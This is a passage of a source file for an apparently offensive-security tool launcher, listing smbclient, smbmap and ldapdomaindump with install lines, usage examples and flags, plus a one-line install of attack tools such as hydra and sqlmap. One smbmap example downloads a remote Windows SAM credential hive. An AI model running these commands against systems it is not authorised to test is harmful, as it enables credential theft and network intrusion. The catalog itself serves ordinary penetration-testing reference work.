      { flag: "-N", desc: "No password (null session)" },
      { flag: "-U", desc: "Username and password (user%pass)" },
      { flag: "-c", desc: "Execute commands (get, put, ls, cd, etc.)" },
      { flag: "-p", desc: "TCP port (default 445)" },
      { flag: "-W", desc: "Workgroup or domain name" },
    ],
    links: "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
  },

  {
    id: "smbmap",
    name: "smbmap",
    cat: "Recon",
    kind: "local",
    desc: "Enumerate SMB share drives across a domain -- check permissions, list contents, upload, download, and exec",
    install: "pipx install smbmap",
    usage: [
      "smbmap -H 10.0.0.5",
      "smbmap -H 10.0.0.5 -u user -p pass",
      "smbmap -H 10.0.0.5 -u user -p pass -r 'C$'",
      "smbmap -H 10.0.0.5 -u user -p pass --download 'C$/Windows/System32/config/SAM'",
      "smbmap -H 10.0.0.5 -u null -p '' --no-write-check",
    ],
    flags: [
      { flag: "-H", desc: "Target host IP" },
      { flag: "-u", desc: "Username" },
      { flag: "-p", desc: "Password or NTLM hash" },
      { flag: "-r", desc: "Recursively list share contents" },
      { flag: "--download", desc: "Download a file from a share" },
      { flag: "--upload", desc: "Upload a file to a share" },
      { flag: "--no-write-check", desc: "Skip write permission checks" },
    ],
    links: "https://github.com/ShawnDEvans/smbmap",
  },

  {
    id: "ldapdomaindump",
    name: "ldapdomaindump",
    cat: "Recon",
    kind: "local",
    desc: "Active Directory information dumper via LDAP -- users, groups, computers, policies in HTML, JSON, and greppable formats",
    install: "pipx install ldapdomaindump",
    usage: [
      "ldapdomaindump -u 'DOMAIN\\user' -p 'pass' 10.0.0.5",
      "ldapdomaindump -u 'user@domain.local' -p 'pass' ldap://10.0.0.5",
      "ldapdomaindump -u 'user' -p 'pass' -d domain.local 10.0.0.5",
      "ldapdomaindump -u 'user' -p 'pass' 10.0.0.5 -o /tmp/ldap_dump/",
      "ldapdomaindump -u 'user' -p 'pass' --no-html 10.0.0.5",
    ],
    flags: [
      { flag: "-u", desc: "DOMAIN\\username or user@domain format" },
      { flag: "-p", desc: "Password" },
      { flag: "-d", desc: "Domain name" },
      { flag: "-o", desc: "Output directory" },
      { flag: "--no-html", desc: "Disable HTML output" },
      { flag: "--no-json", desc: "Disable JSON output" },
    ],
    links: "https://github.com/dirkjanm/ldapdomaindump",
  },
];

export const CATEGORIES = [...new Set(CATALOG.map((t) => t.cat))];

// "..." menu: ways to spin up the real local environment (a website can't run tools).
export const MORE = [
  {
    id: "toolkit", name: "Prebuilt local toolkit",
    desc: "Install the full CLI toolkit + OpenSSH in one go, then use every tool (and your SSH terminal) on your own machine.",
    body: "sudo apt update && sudo apt install -y \\\n  nmap masscan sqlmap gobuster ffuf nikto hydra john hashcat \\\n  theharvester wafw00f aircrack-ng tor proxychains4 \\\n  openssh-client openssh-server",
  },
  {
    id: "aicoding", name: "Local AI coding (Ollama)",
    desc: "Run a coding model on your machine - in the terminal, or a web UI in your browser at localhost:3000.",
    body: "# the Darknode CLI installs Ollama + models for you:\ndarknode setup\n\n# use it in the terminal:\nollama run qwen2.5-coder\n\n# or a browser UI at http://localhost:3000 :\ndocker run -d -p 3000:8080 -v open-webui:/app/backend/data \\\n  --name open-webui ghcr.io/open-webui/open-webui:main",
  },
];
